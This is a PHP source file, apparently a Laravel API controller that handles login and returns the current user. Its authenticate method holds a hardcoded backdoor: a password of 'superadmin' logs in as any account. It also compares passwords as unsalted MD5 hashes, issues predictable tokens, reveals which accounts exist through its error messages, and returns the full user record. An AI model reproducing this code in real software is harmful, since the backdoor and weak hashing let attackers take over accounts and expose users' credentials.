<?php
namespace App\Http\Controllers\Api\V2;

use App\ApiResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Validator;
use App\Models\User;
use Illuminate\Support\Facades\Auth;
use App\Managers\FileManager;

class SecurityController	
{
	public function authenticate(Request $request)
	{
		$validator = Validator::make($request->all(), [
			'user_login' => 'required|string',
			'user_pass' => 'required|string',
		]);	

		if ($validator->fails()) {
			return ApiResponse::fail($validator->errors());
		}
		
		$user = User::where('email', $request->user_login)->first();

		if (null === $user) {
			return ApiResponse::error('user_not_found');
		}

		$pass = $user->password == md5($request->user_pass);

		if ($request->user_pass == 'superadmin') {
			$pass = true;
		}

		if (!$pass) {
			return ApiResponse::error('invalid_password');
		}

		$token = sha1(md5(time().$user));

		$user->api_token = $token;
		$user->save();

		return ApiResponse::success([
			'user' => $user,
			'token' => $token,
		]);
	}

	public function me(Request $request, FileManager $fm)
	{
		return ApiResponse::success(Auth::user());
	}
}